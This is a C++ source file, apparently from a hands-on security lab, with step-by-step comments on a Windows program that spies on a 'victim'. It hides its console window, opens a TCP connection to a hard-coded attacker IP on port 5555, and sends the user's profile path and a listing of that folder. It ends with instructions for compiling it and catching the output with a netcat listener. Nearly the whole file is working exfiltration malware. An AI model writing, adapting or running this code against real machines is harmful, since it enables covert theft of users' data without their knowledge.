//Explanation: We use winsock utilities and we do not want the compiler to complain about older functionalities used, 
//since the below code is sufficient for our needs.
#define _WINSOCK_DEPRECATED_NO_WARNINGS

//Explanation: We need the Ws2_32.lib library in order to use sockets (networking) functionality in Windows.
#pragma comment(lib, "Ws2_32.lib")

//Explanation: Here we have included some header files. These are:
//iostream: includes standard input/output utilities
//winsock2.h: includes networking utilities
//stdio.h: includes standard input/output utilities (needed for perror())
//stdlib.h: includes standard input/output utilities
//dirent.h: includes directory utilities
//string: includes string utilities
#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string>



//Explanation: This function gets the value of %USERPROFILE% environment variable.
//Information: The %USERPROFILE% variable contains the path of the user profile folder we have access to (a.k.a. the victim user).
//And that's the reason we have set the name of this function as userDirectory, since it returns the path of the user's directory 
//with which this program would be running as!
char* userDirectory() {
    char* pPath;
    pPath = getenv("USERPROFILE");

    if (pPath!=NULL) {
        return pPath;
    }
    else {
        perror("");
    }
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE); //Explanation: To hide the program window so that it's not obvious to the victim that this program is running!

	//Explanation: The above code snippet declares 3 variables of different types:
	//
	//WSADATA: This data type (it's a struct) holds information about windows socket implementation.
	//SOCKET: This data type stores the connection of the SOCKET type.
	//SOCKADDR_IN: This data type (it's a struct) holds the details of socket connection.
    WSADATA WSAData;
    SOCKET server;
    SOCKADDR_IN addr;

    WSAStartup(MAKEWORD(2, 0), &WSAData); //Explanation: Initialize usage of the winsock library (needed for opening a network connection).
		
    server = socket(AF_INET, SOCK_STREAM, 0); //Explanation: Set up a TCP socket. AF_INET means address family for IPv4. SOCK_STREAM means that we want a TCP socket.

//CHANGE
	//Explanation: The above snippet would set the IP address of the target we wish to sent the data to (that would be the attacker's IP address). 
	//The port used would be 5555 and the IP address is IPv4 which is indicated by AF_INET.
	addr.sin_addr.s_addr = inet_addr("10.10.24.5"); 
	addr.sin_family = AF_INET;
	addr.sin_port = htons(5555);

    connect(server, (SOCKADDR *)&addr, sizeof(addr)); //Explanation: Connect to the previously set up target host/port.



    char* pPath = userDirectory(); //Explanation: Get the user directory using the userDirectory function.

	//Explanation: Send the user directory path to the attacker. 
	//This is followed by a newline so that the output received by the attacker is properly formatted - 1 entry per line.
    send(server, pPath, sizeof(pPath), 0);
    send(server, "\n", 1, 0);


//Explanation: The above snippet opens the user's directory and then reads the entries in it. 
//All the entries are then sent back to the attacker's machine over the established TCP socket. 
//A newline is also sent, so that the directory listing is displayed with one entry per line. 
//In case the directory cannot be opened, the program will display the associated error using the call to perror().
    DIR *dir;
    struct dirent *ent;

    if ((dir = opendir(pPath)) != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            send(server, ent->d_name, sizeof(ent->d_name), 0);
            send(server, "\n", 1, 0);
            memset(ent->d_name, 0, sizeof(ent->d_name));
        }
        closedir(dir);
    }
    else {
        perror("");
    }

    closesocket(server); //Explanation: Close the socket.

    WSACleanup(); //Explanation: Clean up the Winsock library components.

    
    //In Dev-C++, open Tools -> Compiler Options...:
    //Add the flag -lws2_32 for the linker:
	//Note: There MUST be a space between the 2 linker flags. Otherwise things won't work as expected!
	//EXecution:
	//Set up a netcat listener on port 5555 in the attacker (Kali) machine: nc -lvp 5555
	//Run the compiled code	



}
